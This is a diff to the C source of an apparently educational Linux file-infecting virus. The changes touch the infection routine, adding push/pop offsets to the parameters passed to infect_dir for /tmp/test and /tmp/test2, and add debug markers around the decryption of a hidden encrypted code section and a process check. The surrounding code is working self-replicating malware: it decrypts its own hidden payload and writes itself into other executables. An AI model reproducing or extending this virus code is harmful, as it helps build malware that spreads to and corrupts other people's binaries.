@@ -26,6 +26,9 @@ asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
 asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
 asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
 }
+extern char _infect_push;
+extern char _infect_pop;
+
 
 extern char data;
 extern char dataearly;
@@ -39,7 +42,6 @@ extern uint64_t fingerprint;
 //======================== WAR ===============================
 
 uint32_t ft_rand(){
-		seed ^= fingerprint;
 		seed = ((uint64_t)seed * 48271u) % 0x7fffffff;
 		return seed;
 }
@@ -96,14 +98,16 @@ int __start decryptHiddenCode(){
 		uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);
 		char *s = ((char*)&crypt_start);
 		//environ[0] = 'c'; debug(environ);
+		environ[0]='0';debug(environ);
 		if (decrypt(s,n,k, iscompressed, &DECRYPT_ROUTINE) == -1)
 				return FALSE;
+		environ[0]='1';debug(environ);
 		//environ[0] = 'd'; debug(environ);
 
 		for (int i = 0; i < 15; i++)
 				if ((&test_area)[i] != 'A')
 						return FALSE;
-
+		environ[0]='3';debug(environ);
 		return TRUE;
 }
 
@@ -122,9 +126,13 @@ void do_infection(){
 		size_t decrypt_routine_off = ((size_t)&DECRYPT_ROUTINE) - ((size_t)&bin_start);
 		size_t data_off = ((size_t)&data) - ((size_t)&bin_start);
 		size_t dataearly_off = ((size_t)&dataearly) - ((size_t)&bin_start);
+		
+		size_t infectpush_off = ((size_t)&_infect_push) - ((size_t)&bin_start);
+		size_t infectpop_off = ((size_t)&_infect_pop) - ((size_t)&bin_start);
 
-		infect_dir("/tmp/test", (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len, decrypt_routine_off, &DECRYPT_ROUTINE,data_off,dataearly_off}, opt);
-		infect_dir("/tmp/test2", (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len, decrypt_routine_off, &DECRYPT_ROUTINE,data_off,dataearly_off}, opt);
+		InfectParams x = (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len, decrypt_routine_off, &DECRYPT_ROUTINE,data_off,dataearly_off,infectpush_off,infectpop_off};
+		infect_dir("/tmp/test", x, opt);
+		infect_dir("/tmp/test2", x, opt);
 }
 
 int virus(void){
@@ -168,9 +176,11 @@ __start int main(void){
 		cmp[3] = 't';
 		cmp[4] = '\0';
 		environ[1]='\0';environ[2]='\0';
-		debug(environ);
-		if (checkproc(cmp) == FALSE)
+		environ[0]='?';debug(environ);
+		if (checkproc(cmp) == FALSE){
+				environ[0]='!';debug(environ);
 				return FALSE;
+		}
 		((unsigned char *)key)[0] ^= 0b01110010;
 		//if (checkdebug() == 0)
 		return decryptHiddenCode() && virus();
